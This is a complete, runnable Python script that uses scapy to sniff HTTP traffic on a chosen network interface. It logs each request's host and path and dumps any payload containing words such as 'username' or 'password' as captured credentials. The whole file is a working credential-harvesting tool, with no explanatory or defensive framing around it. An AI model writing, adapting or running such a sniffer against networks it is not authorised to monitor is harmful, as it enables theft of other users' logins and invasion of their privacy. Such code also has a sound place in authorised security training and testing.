#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http


def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Specify interface to sniff packets on")
    arguments = parser.parse_args()
    return arguments.interface

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode(errors="ignore")
        path = packet[http.HTTPRequest].Path.decode(errors="ignore")
        print(f"[+] HTTP Request >> {host}{path}")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print(f"[+] Possible username/password >> {load}")
                    break

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

iface = get_interface()
sniff(iface)
